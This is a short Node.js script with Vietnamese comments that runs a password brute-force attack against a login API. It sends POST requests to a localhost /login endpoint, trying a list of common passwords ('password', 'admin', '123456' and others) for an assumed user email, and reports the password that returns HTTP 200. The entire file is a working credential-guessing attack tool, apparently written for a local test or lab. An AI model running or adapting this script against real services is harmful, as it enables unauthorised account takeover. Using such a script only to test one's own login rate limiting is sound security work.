const axios = require('axios');

// Địa chỉ API server
const serverURL = 'http://localhost:5001/login';

// Danh sách mật khẩu thử nghiệm
const passwordList = [
  'password',
  'admin',
  'letmein',
  'qwerty',
  '12345',
  '123456',
];

// Hàm brute force
const bruteForce = async () => {
  for (const password of passwordList) {
    try {
      // Gửi yêu cầu đăng nhập
      const response = await axios.post(serverURL, {
        email: 'user@example.com', // Giả sử biết email
        password: password,
      });

      // Kiểm tra kết quả
      if (response.status === 200) {
        console.log(`Thành công! Mật khẩu đúng là: ${password}`);
        break; // Dừng khi tìm được mật khẩu
      }
    } catch (error) {
      console.log(`Thử mật khẩu: ${password} - Thất bại`);
    }
  }
};

// Bắt đầu tấn công brute force
bruteForce();
